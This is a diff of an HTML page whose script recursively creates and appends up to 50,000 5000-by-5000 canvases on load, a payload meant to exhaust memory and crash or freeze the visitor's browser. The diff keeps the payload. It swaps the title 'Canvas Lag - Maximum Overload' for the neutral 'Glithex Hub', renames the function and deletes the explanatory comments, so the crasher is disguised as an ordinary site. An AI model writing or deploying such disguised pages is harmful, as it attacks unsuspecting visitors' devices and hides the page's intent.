@@ -1,38 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Canvas Lag - Maximum Overload</title>
+  <title>Glithex Hub</title>
 </head>
 <body>
 <script>
-function overloadCanvas() {
+function MainCanvas() {
     let counter = 0;
 
     function createCanvas() {
-        // Create extremely large canvases and use them directly in memory
         const canvas = document.createElement('canvas');
-        canvas.width = 5000;  // Larger size for more memory usage
-        canvas.height = 5000;  // Larger size for more memory usage
+        canvas.width = 5000;
+        canvas.height = 5000;
         const ctx = canvas.getContext('2d');
-
-        // Fill canvas with color or simple operations to force rendering
         ctx.fillStyle = 'rgb(0,0,0)';
         ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-        // Appending the canvas to the body to increase DOM load
         document.body.appendChild(canvas);
-
-        // Increase the number of canvases created
         counter++;
-        if (counter < 50000) {  // Increase number of canvases to 50,000
-            createCanvas();  // Continue without delay
+        if (counter < 50000) {
+            createCanvas();
         }
     }
 
-    createCanvas();  // Start creating canvases
+    createCanvas();
 }
 
-overloadCanvas();
+MainCanvas();
 </script>
 </body>
 </html>
